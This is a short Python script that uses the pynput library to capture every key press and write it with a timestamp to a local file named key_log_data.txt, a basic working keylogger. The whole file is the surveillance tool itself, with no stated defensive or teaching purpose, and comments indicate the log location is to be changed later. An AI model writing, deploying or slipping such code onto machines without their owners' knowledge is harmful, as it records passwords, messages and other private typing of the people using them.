from pynput.keyboard import Key, Listener
import logging

#set up logging directory
#leave empty for current directory
#will later be changed to specific directory
log_dir = ""
#set up logging module
logging.basicConfig(filename=(log_dir + "key_log_data.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

#function to log key presses
def on_press(key):
    logging.info(str(key))
#key will be logged as a string

#set up listener
with Listener(on_press=on_press) as listener:
    listener.join()
    